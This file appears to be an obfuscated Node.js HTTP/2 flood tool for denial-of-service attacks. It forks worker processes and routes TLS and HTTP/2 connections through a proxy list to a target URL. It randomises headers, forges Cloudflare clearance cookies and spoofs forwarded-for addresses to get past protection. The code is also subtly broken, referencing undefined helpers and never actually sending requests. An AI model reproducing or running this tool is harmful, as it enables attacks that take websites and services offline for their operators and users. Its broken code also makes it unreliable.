process.on('uncaughtException', function (_0x5d4d2b) {});
process.on("unhandledRejection", function (_0x3b5976) {});
process.on("SIGHUP", () => {
  return 0x1;
});
process.on('SIGCHILD', () => {
  return 0x1;
});
require('events').EventEmitter.defaultMaxListeners = 0x0;
process.setMaxListeners(0x0);
const cluster = require("cluster");
const crypto = require('crypto');
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require('fs');
var path = require("path");
var colors = require("colors");
var file = path.basename(__filename);
if (process.argv.length < 0x7) {
  console.log("node TLS URL TIME REQUESTS THEARD PROXY");
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = "GREASE:" + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], defaultCiphers.slice(0x3)].join(':');
const sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_client_method";
"TLSv1_1_method";
"TLSv1_2_method";
"TLSv1_3_method";
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': "TLS_client_method"
};
const secureContext = tls.createSecureContext(secureContextOptions);
const headers = {};
function readLines(_0x4bdc28) {
  return fs.readFileSync(_0x4bdc28, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x586708, _0x5d645f) {
  return Math.floor(Math.random() * (_0x5d645f - _0x586708) + _0x586708);
}
function randomElement(_0x21cd25) {
  return _0x21cd25[Math.floor(Math.random() * (_0x21cd25.length - 0x0) + 0x0)];
}
function randomCharacters(_0x2dd9e1) {
  output = '';
  for (let _0x24ce8e = 0x0; _0x24ce8e < _0x2dd9e1; _0x24ce8e++) {
    output += characters[Math.floor(Math.random() * (characters.length - 0x0) + 0x0)];
  }
  return output;
}
const args = {
  'target': process.argv[0x2],
  'time': process.argv[0x3],
  'rate': process.argv[0x4],
  'threads': process.argv[0x5],
  'proxy': process.argv[0x6],
  'cookie': process.argv[0x7] || undefined
};
const accept_header = ['*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*", "text/html, application/xhtml+xml, image/jxr, */*", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1", "application/javascript, */*;q=0.8", "text/html, text/plain; q=0.6, */*; q=0.1", "application/graphql, application/json; q=0.8, application/xml; q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel'];
const cache_header = ["no-cache", 'no-store', "no-transform", "only-if-cached", 'max-age=0', "must-revalidate", 'public', "private", 'proxy-revalidate'];
const lang_header = ['he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", 'en-US,en;q=0.9', 'de-CH;q=0.7', "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", 'pt-BR,pt;q=0.9', "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", 'ru-RU,ru;q=0.9', "si-LK,si;q=0.9", 'sk-SK,sk;q=0.9', "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", 'tr-TR,tr;q=0.9', "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", 'am-ET,am;q=0.8', "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", 'bn-BD,bn;q=0.8', 'bs-Cyrl-BA,bs;q=0.8', 'bs-Latn-BA,bs;q=0.8', "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", 'fr-BE,fr;q=0.8', "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", 'is-IS,is;q=0.8', "jv-Latn-ID,jv;q=0.8", 'ka-GE,ka;q=0.8', "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", 'km-KH,km;q=0.8', "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", 'ln-CG,ln;q=0.8', "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", 'ms-BN,ms;q=0.8', "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", 'nds-DE,nds;q=0.8', "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", 'quz-EC,quz;q=0.8', "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", 'se-NO,se;q=0.8', "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", 'tt-RU,tt;q=0.8', "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", 'zgh-MA,zgh;q=0.8', "zu-ZA,zu;q=0.8"];
const platform = ["Windows", "Macintosh", 'Linux', 'iOS', "Android", "PlayStation 4", "iPhone", "iPad", 'Other'];
const dest_header = ['audio', "audioworklet", 'document', 'embed', 'empty', "font", "frame", "iframe", "image", "manifest", "object", "paintworklet", "report", "script", "serviceworker", 'sharedworker', "style", 'track', "video", "worker", 'xslt', ''];
const mode_header = ["cors", "navigate", "no-cors", "same-origin", "websocket"];
const site_header = ["cross-site", "same-origin", "same-site", "none"];
const encoding_header = ["deflate, gzip;q=1.0, *;q=0.5", "gzip, deflate, br", "gzip, deflate", '*'];
var proxies = fs.readFileSync(args.proxy, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let i = 0x0; i < process.argv[0x5]; i++) {
    cluster.fork();
  }
  console.clear();
  console.log("á´€á´›á´›á´€á´„á´‹ sá´‡É´á´›:Êœá´á´€ÉªÉ´á´€á´".bgRed);
  console.log("TLS SHARE".blue);
  setTimeout(() => {}, process.argv[0x5] * 0x3e8);
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  for (let i = 0x0; i < 0xa; i++) {
    setInterval(runFlooder, 0x0);
  }
}
class NetSocket {
  constructor() {}
  ['HTTP'](_0x1e2b69, _0x5505db) {
    const _0x4a0584 = "CONNECT " + _0x1e2b69.address + ":443 HTTP/1.1\r\nHost: " + _0x1e2b69.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x17ee88 = new Buffer.from(_0x4a0584);
    const _0x2e1452 = net.connect({
      'host': _0x1e2b69.host,
      'port': _0x1e2b69.port,
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x2e1452.setTimeout(_0x1e2b69.timeout * 0x4e20);
    _0x2e1452.setKeepAlive(true, 0x4e20);
    _0x2e1452.setNoDelay(true);
    _0x2e1452.on("connect", () => {
      _0x2e1452.write(_0x17ee88);
    });
    _0x2e1452.on("data", _0x43987b => {
      const _0x17e270 = _0x43987b.toString("utf-8");
      const _0x17ecaf = _0x17e270.includes("HTTP/1.1 200");
      if (_0x17ecaf === false) {
        _0x2e1452.destroy();
        return _0x5505db(undefined, "403");
      }
      return _0x5505db(_0x2e1452, undefined);
    });
    _0x2e1452.on("timeout", () => {
      _0x2e1452.destroy();
      return _0x5505db(undefined, "403");
    });
    _0x2e1452.on('error', _0x377a92 => {
      _0x2e1452.destroy();
      return _0x5505db(undefined, "403");
    });
  }
}
const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))];
const Socker = new NetSocket();
headers[':method'] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = accept_header[Math.floor(Math.random() * accept_header.length)];
headers['accept-encoding'] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers.pragma = "no-cache";
headers.cookie = process.argv[0x7];
headers['sec-ch-ua'] = uas;
headers["cf-cache-status"] = "DYNAMIC";
headers.referer = "https://www.google.com/";
headers.priority = "u=0, 1";
headers.origin = parsedTarget.host;
headers.cookie = 'cf_clearance=' + randstr(0x4) + '.' + randstr(0x14) + '.' + randstr(0x28) + "-0.0.1 " + randstr(0x14) + ';_ga=' + randstr(0x14) + ';_gid=' + randstr(0xf);
headers["cdn-loop"] = "cloudflare";
headers["sec-ch-ua-mobile"] = '?0';
headers['sec-ch-ua-platform'] = platform[Math.floor(Math.random() * platform.length)];
headers['sec-fetch-dest'] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers['sec-fetch-mode'] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers["sec-fetch-user"] = '1';
headers["upgrade-insecure-requests"] = '1';
headers["user-agent"] = uas;
headers["x-requested-with"] = "XMLHttpRequest";
function runFlooder() {
  const _0x38a475 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x36c7b6 = _0x38a475.split(':');
  headers[":authority"] = parsedTarget.host;
  headers['x-forwarded-for'] = _0x36c7b6[0x0];
  headers["x-forwarded-proto"] = "https";
  const _0x51a6f6 = {
    'host': _0x36c7b6[0x0],
    'port': _0x36c7b6[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x96
  };
  Socker.HTTP(_0x51a6f6, (_0x2a2b5e, _0x115d8a) => {
    if (_0x115d8a) {
      return;
    }
    _0x2a2b5e.setKeepAlive(true, 0x15f90);
    _0x2a2b5e.setNoDelay(true);
    const _0x86f863 = {
      'enablePush': false,
      'initialWindowSize': 0x3fffffff
    };
    const _0x19417e = {
      'port': 0x1bb,
      'ALPNProtocols': ['h2', "spdy/3.1", "http/1.1"],
      'secure': true,
      'ciphers': ciphers,
      'sigalgs': 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
      'requestCert': true,
      'socket': _0x2a2b5e,
      'ecdhCurve': "GREASE:x25519:secp256r1:secp384r1",
      'honorCipherOrder': false,
      'rejectUnauthorized': false,
      'servername': url.hostname,
      'host': parsedTarget.host,
      'servername': parsedTarget.host,
      'secureOptions': secureOptions,
      'secureContext': secureContext,
      'secureProtocol': "TLS_client_method"
    };
    const _0x4668f9 = tls.connect(0x1bb, parsedTarget.host, _0x19417e);
    _0x4668f9.allowHalfOpen = true;
    _0x4668f9.setNoDelay(true);
    _0x4668f9.setKeepAlive(true, 6000000);
    _0x4668f9.setMaxListeners(0x0);
    const _0x32127a = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x3e8,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x40000,
        'enablePush': false
      },
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x4668f9,
      'socket': _0x2a2b5e
    });
    _0x32127a.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x3e8,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x32127a.setMaxListeners(0x0);
    _0x32127a.settings(_0x86f863);
    _0x32127a.on("connect", () => {});
    _0x32127a.on("close", () => {
      _0x32127a.destroy();
      _0x2a2b5e.destroy();
      return;
    });
    _0x32127a.on('error', _0x169c14 => {
      _0x32127a.destroy();
      _0x2a2b5e.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit();
setTimeout(KillScript, args.time * 0x3e8);